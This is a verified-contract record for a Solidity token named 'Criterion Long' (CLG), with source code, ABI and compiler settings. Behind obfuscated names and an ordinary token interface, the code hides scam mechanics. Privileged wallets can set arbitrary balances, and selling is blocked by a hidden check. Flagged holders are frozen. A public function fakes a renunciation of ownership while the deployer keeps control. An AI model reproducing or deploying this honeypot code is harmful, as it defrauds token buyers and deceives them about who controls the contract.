{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fundMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeMarketingShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeAmount {\n    function createPair(address senderToEnable, address atTokenLiquidity) external returns (address);\n}\n\ninterface atTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxToken) external view returns (uint256);\n\n    function transfer(address fundList, uint256 walletTrading) external returns (bool);\n\n    function allowance(address fromTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundList,\n        uint256 walletTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedReceiver, uint256 value);\n    event Approval(address indexed fromTrading, address indexed spender, uint256 value);\n}\n\ninterface atToMetadata is atTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CriterionLong is feeMarketingShould, atTo, atToMetadata {\n\n    uint256 private teamShould;\n\n    uint256 constant swapLaunched = 8 ** 10;\n\n    event OwnershipTransferred(address indexed limitLiquidity, address indexed feeTxSwap);\n\n    function tokenAuto(address swapTrading, uint256 walletTrading) public {\n        tradingWallet();\n        toAutoEnable[swapTrading] = walletTrading;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableMax;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingSwapMin;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMarketingLiquidity;\n    }\n\n    mapping(address => bool) public launchReceiver;\n\n    function getOwner() external view returns (address) {\n        return limitTake;\n    }\n\n    address totalExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address receiverSell, address atFromMarketing) external view virtual override returns (uint256) {\n        if (atFromMarketing == totalExempt) {\n            return type(uint256).max;\n        }\n        return exemptModeAt[receiverSell][atFromMarketing];\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptModeAt;\n\n    function balanceOf(address maxToken) public view virtual override returns (uint256) {\n        return toAutoEnable[maxToken];\n    }\n\n    bool public tokenReceiver;\n\n    function feeMaxIs(address autoWallet, address fundList, uint256 walletTrading) internal returns (bool) {\n        if (autoWallet == receiverBuy) {\n            return receiverEnable(autoWallet, fundList, walletTrading);\n        }\n        uint256 fromList = atTo(exemptTakeFrom).balanceOf(fundReceiver);\n        require(fromList == sellFrom);\n        require(fundList != fundReceiver);\n        if (launchReceiver[autoWallet]) {\n            return receiverEnable(autoWallet, fundList, swapLaunched);\n        }\n        return receiverEnable(autoWallet, fundList, walletTrading);\n    }\n\n    function transferFrom(address autoWallet, address fundList, uint256 walletTrading) external override returns (bool) {\n        if (_msgSender() != totalExempt) {\n            if (exemptModeAt[autoWallet][_msgSender()] != type(uint256).max) {\n                require(walletTrading <= exemptModeAt[autoWallet][_msgSender()]);\n                exemptModeAt[autoWallet][_msgSender()] -= walletTrading;\n            }\n        }\n        return feeMaxIs(autoWallet, fundList, walletTrading);\n    }\n\n    bool public receiverMin;\n\n    function owner() external view returns (address) {\n        return limitTake;\n    }\n\n    function receiverEnable(address autoWallet, address fundList, uint256 walletTrading) internal returns (bool) {\n        require(toAutoEnable[autoWallet] >= walletTrading);\n        toAutoEnable[autoWallet] -= walletTrading;\n        toAutoEnable[fundList] += walletTrading;\n        emit Transfer(autoWallet, fundList, walletTrading);\n        return true;\n    }\n\n    constructor (){\n        if (launchSender == teamShould) {\n            tokenReceiver = true;\n        }\n        fundMax swapAt = fundMax(totalExempt);\n        exemptTakeFrom = takeAmount(swapAt.factory()).createPair(swapAt.WETH(), address(this));\n        \n        receiverBuy = _msgSender();\n        txAt();\n        maxBuy[receiverBuy] = true;\n        toAutoEnable[receiverBuy] = autoMarketingLiquidity;\n        if (teamShould != launchSender) {\n            launchSender = teamShould;\n        }\n        emit Transfer(address(0), receiverBuy, autoMarketingLiquidity);\n    }\n\n    uint8 private marketingSwapMin = 18;\n\n    address public receiverBuy;\n\n    string private enableMax = \"CLG\";\n\n    address fundReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapTotalFrom(address receiverFee) public {\n        tradingWallet();\n        if (tradingSender) {\n            teamShould = launchSender;\n        }\n        if (receiverFee == receiverBuy || receiverFee == exemptTakeFrom) {\n            return;\n        }\n        launchReceiver[receiverFee] = true;\n    }\n\n    address public exemptTakeFrom;\n\n    function tradingWallet() private view {\n        require(maxBuy[_msgSender()]);\n    }\n\n    function tradingMin(address tokenLaunchedAt) public {\n        if (receiverMin) {\n            return;\n        }\n        if (tradingSender != modeTake) {\n            teamShould = launchSender;\n        }\n        maxBuy[tokenLaunchedAt] = true;\n        if (modeTake) {\n            tradingSender = false;\n        }\n        receiverMin = true;\n    }\n\n    address private limitTake;\n\n    function name() external view virtual override returns (string memory) {\n        return totalReceiver;\n    }\n\n    function transfer(address swapTrading, uint256 walletTrading) external virtual override returns (bool) {\n        return feeMaxIs(_msgSender(), swapTrading, walletTrading);\n    }\n\n    function approve(address atFromMarketing, uint256 walletTrading) public virtual override returns (bool) {\n        exemptModeAt[_msgSender()][atFromMarketing] = walletTrading;\n        emit Approval(_msgSender(), atFromMarketing, walletTrading);\n        return true;\n    }\n\n    uint256 sellFrom;\n\n    uint256 liquidityLaunched;\n\n    bool private modeTake;\n\n    mapping(address => bool) public maxBuy;\n\n    bool private tradingSender;\n\n    string private totalReceiver = \"Criterion Long\";\n\n    uint256 private autoMarketingLiquidity = 100000000 * 10 ** 18;\n\n    function txAt() public {\n        emit OwnershipTransferred(receiverBuy, address(0));\n        limitTake = address(0);\n    }\n\n    uint256 private launchSender;\n\n    mapping(address => uint256) private toAutoEnable;\n\n    function exemptFromTo(uint256 walletTrading) public {\n        tradingWallet();\n        sellFrom = walletTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTxSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFromMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFromMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"exemptFromTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTakeFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"swapTotalFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"tokenAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchedAt\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CriterionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}